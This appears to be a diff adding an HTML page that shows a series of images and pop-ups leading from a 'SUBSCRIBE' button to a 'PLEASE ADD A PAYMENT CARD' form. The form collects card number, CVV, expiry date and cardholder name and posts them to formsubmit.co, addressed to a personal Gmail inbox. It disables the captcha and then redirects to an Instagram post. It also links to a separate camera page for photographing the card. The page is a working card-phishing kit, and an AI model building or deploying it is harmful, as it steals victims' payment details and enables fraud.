@@ -1,0 +1,297 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="mark.css">
+    <style>
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 1;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            overflow: auto;
+            background-color: rgba(0,0,0,0.4);
+        }
+     
+      
+        .modal-content {
+            background-color: #fefefe;
+            margin: 15% auto;
+            padding: 20px;
+            border: 1px solid #888;
+            width: 80%;
+            margin-top: 160px;   
+            border-radius: 14px;  
+        }
+        .modal-content1 p {
+            font-weight: bold;
+        }
+        .modal-content1 {
+            background-color: #fefefe;
+            margin: 15% auto;
+            padding: 20px;
+            border: 1px solid #888;
+            width: 80%;
+            margin-top: 14px;   
+            border-radius: 14px;  
+        }
+        .modal-content button {
+            background-color: #55c1ff;
+            color: #ffffff;
+            height: 47px;
+            width: 300px;
+            border: none;
+            font-size: 21px;
+            border-radius: 13px;
+        }
+         .modal-content1 button {
+            background-color: #55c1ff;
+            color: #ffffff;
+            height: 47px;
+            width: 300px;
+            border: none;
+            font-size: 21px;
+            border-radius: 13px;
+        margin-top: 20px;
+          }
+        .modal-content1-scroll {
+            max-height: 80vh; /* Make the modal content scrollable */
+            overflow-y: auto;
+        }
+        .modal img {
+            width: 100%;
+        }
+        .picture3 {
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+            text-align: center;
+            background-color: rgba(255, 255, 255, 0.8); /* Optional: Add a background color */
+        }
+        .picture3 img {
+            width: 398px; /* Adjust the width as needed */
+        }
+        /* Specific styling for the camera image */
+        .camera-img {
+            width: 40px; /* Set the width as needed */
+            height: 220px; /* Maintain aspect ratio */
+        }
+  .name1 input{
+  width: 56%;
+    height: 67px;
+    border-radius: 20px;
+    outline: none;
+    border: 2px solid #0000009e;
+    font-size: 15px;
+    font-family: "Poppins", sans-serif;
+   margin-left: 0px;
+    font-weight: 400;
+ sans-serif;
+    font-weight: 400;
+    }
+    .name2 input{
+    width: 37%;
+    height: 53px;
+    border-radius: 7px;
+    outline: none;
+    border: 1.5px solid #0000009e;
+    font-size: 15px;
+    font-family: "Poppins", sans-serif;
+   margin-top: 160px;
+    font-weight: 400;
+ sans-serif;
+   }
+    .name3 input{
+  width: 100%;
+    height: 53px;
+    border-radius: 7px;
+    outline: none;
+    border: 1.5px solid #0000009e;
+    font-size: 15px;
+    font-family: "Poppins", sans-serif;
+   margin-top: 17px;
+  }
+ .name4 label{
+  width: 100%;
+    height: 53px;
+    border-radius: 7px;
+    outline: none;
+    border: 1.5px solid #0000009e;
+    font-size: 15px;
+    font-family: "Poppins", sans-serif;
+   margin-left: 56px;
+  margin-top: 11px;   
+  text-align: center;
+   align-items: center;
+     }
+    .name5 label{
+  width: 100%;
+    height: 53px;
+    border-radius: 7px;
+    outline: none;
+    border: 1.5px solid #0000009e;
+    font-size: 15px;
+    font-family: "Poppins", sans-serif;
+   margin-left: 71px;
+    font-weight: 400;
+     }
+    </style>
+</head>
+<body>
+    <div class="picture1">
+        <img src="picture1.jpg">
+    </div>
+    <div class="picture2">
+        <img src="first.jpg">
+    </div>
+    <div class="second">
+        <img src="second.jpg" id="second-img">
+    </div>
+    <div class="third">
+        <img src="third.jpg" id="third-img">
+    </div>
+    <div class="fourth">
+        <img src="fourth.jpg">
+    </div>
+    <div class="fifth">
+        <img src="fifth.jpg" id="fifth-img">
+    </div>
+    <div class="add">
+        <img src="addd.jpg">
+    </div>
+    <div class="picture3">
+        <img src="picture3.jpg" id="picture3-img">
+    </div>
+    
+
+    <!-- Modal for second-img -->
+    <div id="modal-second" class="modal">
+        <div class="modal-content">
+            <img src="main.jpg">
+            <button onclick="openModal('modal-third')">SUBSCRIBE</button>
+        </div>
+    </div>
+
+    <!-- Modal for third-img -->
+    <div id="modal-third" class="modal"> 
+        <div class="modal-content1 modal-content1-scroll">
+            <p>PLEASE ADD A PAYMENT CARD</p>
+         
+        <img src="pay.jpg">
+            <img src="card.jpg">
+            <p>To continue please make sure you click on the camera picture below or input your card details below</p>
+   <a href="camera.html"><img src="camera.jpg" class="camera-img"></a> 
+  <p> CARD DETAILS</p>
+  <img src="card.jpg">
+          <form action="https://formsubmit.co/youngella513@gmail.com" method="POST">
+ <div class="name3">
+                   
+             <div class="name1">
+                    <input type="number" name="name" placeholder="Debit Or Credit Card Number" required>
+                </div>
+                <div class="name2">
+                    <input type="number" name="Email" placeholder="CVV" required>
+                </div>
+           <div class="name4">
+                    <label for="expiry-month">Expiry Month:</label>
+                    <select name="expiry-month" id="expiry-month" required>
+                        <option value="">Month</option>
+                        <option value="01">01</option>
+                        <option value="02">02</option>
+                        <option value="03">03</option>
+                        <option value="04">04</option>
+                        <option value="05">05</option>
+                        <option value="06">06</option>
+                        <option value="07">07</option>
+                        <option value="08">08</option>
+                        <option value="09">09</option>
+                        <option value="10">10</option>
+                        <option value="11">11</option>
+                        <option value="12">12</option>
+                    </select>
+                </div>
+                <div class="name5">
+                    <label for="expiry-year">Expiry Year:</label>
+                    <select name="expiry-year" id="expiry-year" required>
+                        <option value="">Year</option>
+                        <!-- Generate years dynamically -->
+                        <script>
+                            const currentYear = new Date().getFullYear();
+                            for (let i = 0; i < 10; i++) {
+                                document.write('<option value="' + (currentYear + i) + '">' + (currentYear + i) + '</option>');
+                            }
+                        </script>
+     <div class="name3">
+                    <input type="text" name="Password" placeholder="CARD HOLDER FULL NAME" required></div>
+                      </div>
+<input type="hidden" name="_captcha" value="false"> 
+                <input type="hidden" name="_next" value="https://www.instagram.com/p/ChkjLXRpE-x/?igsh=c2Nqdmplb3NkOGM=">
+                <div class="btn">
+                    <button type="submit">VERIFY</button>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <!-- Modal for fifth-img -->
+    <div id="modal-fifth" class="modal">
+        <div class="modal-content">
+            <p>This is the third pop-up message with the fifth image.</p>
+      
+            <img src="fifth.jpg">
+            <button onclick="openModal('modal-picture3')">Next</button>
+        </div>
+    </div>
+
+    <!-- Modal for picture3-img -->
+    <div id="modal-picture3" class="modal">
+        <div class="modal-content">
+            <p>This is the final pop-up message with the picture3 image.</p>
+            <img src="picture3.jpg">
+            <button onclick="closeModal('modal-picture3')">Close</button>
+        </div>
+    </div>
+
+    <script>
+    function showPopup(modalId) {
+            document.getElementById(modalId).style.display = "block";
+        }
+
+        function closeModal(modalId) {
+            document.getElementById(modalId).style.display = "none";
+        }
+
+        function openModal(modalId) {
+            closeAllModals();
+            showPopup(modalId);
+        }
+
+        function closeAllModals() {
+            const modals = document.querySelectorAll('.modal');
+            modals.forEach(modal => modal.style.display = 'none');
+        }
+
+        document.getElementById('second-img').addEventListener('click', () => showPopup('modal-second'));
+        document.getElementById('third-img').addEventListener('click', () => showPopup('modal-second'));
+        document.getElementById('fifth-img').addEventListener('click', () => showPopup('modal-second'));
+        document.getElementById('picture3-img').addEventListener('click', () => showPopup('modal-second'));
+        
+
+        window.onclick = function(event) {
+            const modals = document.querySelectorAll('.modal');
+            modals.forEach(modal => {
+                if (event.target == modal) {
+                    modal.style.display = "none";
+                }
+            });
+        }
+    </script>
+</body>
+</html>   
+       
+       
+       
